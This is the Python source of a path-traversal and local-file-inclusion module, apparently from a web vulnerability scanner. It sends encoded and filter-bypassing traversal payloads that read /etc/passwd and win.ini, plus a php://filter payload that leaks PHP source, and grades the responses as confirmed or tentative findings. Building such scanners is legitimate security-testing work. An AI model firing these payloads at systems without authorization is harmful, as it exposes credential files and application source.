from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403


def _send_get_raw(http, ip, raw_value, *, follow=True):
    """GET where the target param's VALUE is placed into the query string
    LITERALLY (not urlencoded), so payloads like ../ , ..%2f or %00 reach the
    server exactly as written. urlencode() would turn ../ into ..%2F and
    double-encode ..%2f -> ..%252f, which defeats path-traversal encoding
    bypasses — hence this raw builder (used by the traversal module)."""
    others = "&".join(f"{quote(k)}={quote(str(v))}"
                      for k, v in ip.params.items() if k != ip.param)
    q = f"{quote(ip.param)}={raw_value}" + (("&" + others) if others else "")
    sp = urlsplit(ip.url)
    url = urlunsplit((sp.scheme, sp.netloc, sp.path, q, ""))
    return url, http.get(url, follow=follow, cache=False)


_PASSWD_RE = re.compile(r"(?m)^[^\n:]{1,32}:[^\n:]*:\d+:\d+:[^\n:]*:[^\n:]*:[^\n:]*$")


_PASSWD_ROOT_RE = re.compile(r"(?m)^root:[^\n:]*:0:0:")


_WIN_RE = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)


_TRAV_DEPTHS = (1, 2, 3, 4, 5, 6, 7, 8, 10, 12)


def _trav_payloads(full=True):
    """(enc, raw_value, kind) sent LITERALLY via _send_get_raw. Traversal depth
    is target-specific — some apps only resolve at the EXACT depth (no root
    clamping) — so the raw ../ and ....// bypasses are swept across a dense range
    of depths (1..8, 10, 12) rather than a couple of guesses. The nested ....//
    form defeats filters that strip ../ once. Windows uses %5c (URL-safe).
    `full=False` yields a compact set for speculative (guessed-param) endpoints
    so their fan-out stays bounded."""
    P = []
    depths = _TRAV_DEPTHS if full else (4, 6, 8)
    for d in depths:
        P.append((f"raw-{d}",          "../" * d + "etc/passwd",     "nix"))
        P.append((f"dotdotslash-{d}",  "....//" * d + "etc/passwd",  "nix"))
    for d in ((2, 4, 6, 8) if full else (6,)):
        P.append((f"enc-slash-{d}",    "..%2f" * d + "etc%2fpasswd",     "nix"))
        P.append((f"dbl-enc-{d}",      "..%252f" * d + "etc%252fpasswd", "nix"))
    P.append(("abs",          "/etc/passwd",              "nix"))
    P.append(("nullbyte",     "../" * 8 + "etc/passwd%00",       "nix"))
    P.append(("null-png",     "../" * 8 + "etc/passwd%00.png",   "nix"))
    P.append(("win-enc",      "..%5c" * 8 + "windows%5cwin.ini", "win"))
    P.append(("win-alt",      "../" * 8 + "windows/win.ini",     "win"))
    return P


_TRAV_PAYLOADS = _trav_payloads(full=True)


_TRAV_PAYLOADS_LITE = _trav_payloads(full=False)


class PathTraversalModule(_Module):
    name = vuln = "traversal"

    def probe(self, http, ip):
        if not ip.dynamic:
            return []
        sigs = []
        baseline = _send_with(http, ip, "index" + _rand(), follow=True).text
        base_pw = len(_PASSWD_RE.findall(baseline))
        base_root = bool(_PASSWD_ROOT_RE.search(baseline))
        base_win = bool(_WIN_RE.search(baseline))
        if self._debug:
            UI.dim(f"      [trav] {ip.method} {ip.url} [{ip.param}] "
                   f"baseline HTTP-len={len(baseline)} pw={base_pw} root={base_root} win={base_win}")
        # Each distinct ENCODING FAMILY is a genuinely independent bypass
        # mechanism (raw ../ vs ....// vs %2f vs %252f vs %5c defeat different
        # filters), so two families hitting = two independent classes and the
        # ConfidenceEngine can CONFIRM honestly. A single family hitting yields
        # ONE class -> TENTATIVE (surfaced for manual verification) rather than
        # a self-certified CONFIRMED. We deliberately do NOT synthesise a second
        # "differential" class from the same observation.
        seen_families = set()          # one signal per encoding family, not per depth
        payloads = _TRAV_PAYLOADS_LITE if ip.only_vulns == ("traversal",) else _TRAV_PAYLOADS
        for enc, payload, kind in payloads:
            family = re.sub(r"-\d+$", "", enc)   # raw-3/raw-4 -> raw ; enc-slash-6 -> enc-slash
            if family in seen_families:
                continue               # this family already proven — skip deeper depths
            url, resp = _send_get_raw(http, ip, payload, follow=True)
            body = resp.text
            pw = len(_PASSWD_RE.findall(body))
            root = bool(_PASSWD_ROOT_RE.search(body))
            win = bool(_WIN_RE.search(body))
            # PROOF requires the root-anchored `root:...:0:0:` line (unforgeable),
            # absent from baseline. A generic 7-field/2-numeric match without the
            # root anchor is only STRONG — it can coincide with CSV/log/user data,
            # so on its own it must not confirm.
            nix_root = kind == "nix" and root and not base_root
            nix_weak = kind == "nix" and (not root) and pw >= 2 and base_pw == 0
            win_hit = kind == "win" and win and not base_win
            if self._debug:
                flag = ("  <== PASSWD(root)" if nix_root else
                        ("  <== passwd(weak)" if nix_weak else
                         ("  <== WIN.INI" if win_hit else "")))
                snippet = re.sub(r"\s+", " ", (body or "")[:120]).strip()
                UI.dim(f"      [trav] {enc:<16} HTTP {resp.status} len={len(body)} "
                       f"pw={pw} root={root}{flag}")
                UI.dim(f"             {url}")
                UI.dim(f"             body: {snippet!r}")
            if nix_root:
                seen_families.add(family)
                sigs.append(Signal(self.vuln, f"passwd-root[{family}]", f"traversal.{family}",
                                   SignalStrength.PROOF, f"/etc/passwd (root:...:0:0:) via {family} (HTTP {resp.status})",
                                   {"payload": payload, "url": url, "status": resp.status}))
            elif nix_weak:
                seen_families.add(family)
                sigs.append(Signal(self.vuln, f"passwd-format[{family}]", f"traversal.{family}",
                                   SignalStrength.STRONG, f"passwd-shaped content via {family} (HTTP {resp.status})",
                                   {"payload": payload, "url": url, "status": resp.status}))
            elif win_hit:
                seen_families.add(family)
                sigs.append(Signal(self.vuln, f"win.ini[{family}]", f"traversal.{family}",
                                   SignalStrength.PROOF, f"win.ini via {family} (HTTP {resp.status})",
                                   {"payload": payload, "url": url, "status": resp.status}))
            if len(seen_families) >= 2:   # two independent families -> enough; stop probing
                break
        flt = "php://filter/convert.base64-encode/resource=index.php"
        _u, resp = _send_get_raw(http, ip, flt, follow=True)
        body = resp.text
        for token in re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", body):
            try:
                dec = base64.b64decode(token, validate=True).decode("utf-8", "replace")
            except Exception:
                continue
            if "<?php" in dec or _PASSWD_ROOT_RE.search(dec):
                sigs.append(Signal(self.vuln, "php-filter-base64", "traversal.php_filter",
                                   SignalStrength.PROOF, f"php://filter leaked source (HTTP {resp.status})",
                                   {"payload": flt, "status": resp.status}))
                break
        return sigs


def phase_traversal(target, config, runner):
    return _vuln_phase(target, config, runner, "traversal")


def _trav_classify(f):
    """Distinguish a confirmed inclusion (php://filter fired -> code executes,
    possible RCE) from a plain arbitrary-file read."""
    for s in f.get("signals", []):
        if "php-filter" in s.get("technique", "") or s.get("independence") == "traversal.php_filter":
            return "LFI (file inclusion — possible RCE)"
    return "Path Traversal (arbitrary file read)"


def _r_traversal(d):
    return _r_injection("PATH TRAVERSAL / LFI", d, classify=_trav_classify)


INJECTION_MODULES.append(PathTraversalModule)
